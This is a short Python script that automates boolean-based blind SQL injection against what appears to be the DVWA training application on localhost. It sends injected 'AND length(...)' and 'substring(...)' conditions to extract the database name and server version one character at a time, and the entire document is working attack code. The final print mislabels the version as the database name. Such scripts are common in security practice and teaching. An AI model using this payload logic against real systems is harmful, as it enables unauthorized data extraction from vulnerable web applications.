#! /usr/bin/python3

import string
import requests

session = requests.Session()

url = 'http://localhost:8000/vulnerabilities/sqli_blind/'

payloads = string.ascii_lowercase + string.digits + string.punctuation

headers = {'Cookie':'PHPSESSID=l9vou5e16vr3lnac1qdogln7l2; security=low'}

# Find Database length
for i in range(1,10):
    db_len_target = '?id=1\' AND length(database())=' + str(i) + '%23&Submit=Submit#'
    if 'User ID exists in the database.' in session.get(url + db_len_target, headers=headers).text:
        db_len = i
        break
print("Database Length: ",str(db_len))

# Extract Database name from the server.
db_name = ''
for i in range(1,db_len+1):
    for j in payloads:
        extract_name = '?id=1\' AND substring(database(),' + str(i) + ',1)=\'' + str(j) + '\' %23&Submit=Submit#'
        if 'User ID exists in the database.' in session.get(url + extract_name, headers=headers).text:
            db_name += j
print("Database Name: ", str(db_name))

# Find length of the database version.
for i in range(1,30):
    length_version = '?id=1\' AND length(version())='+ str(i) + '%23&Submit=Submit#'
    if 'User ID exists in the database.' in session.get(url + length_version, headers=headers).text:
        length = i 
        break
print("Database version length: ", str(length))

# Extract Database version from the server.
version = ''
for i in range(1,length+1):
    for j in payloads:
        extract_version = '?id=1\' AND substring(version(),' + str(i) + ',1)=\'' + str(j) + '\' %23&Submit=Submit#'
        if 'User ID exists in the database.' in session.get(url + extract_version, headers=headers).text:
            version += j
print("Database Name: ", str(version))
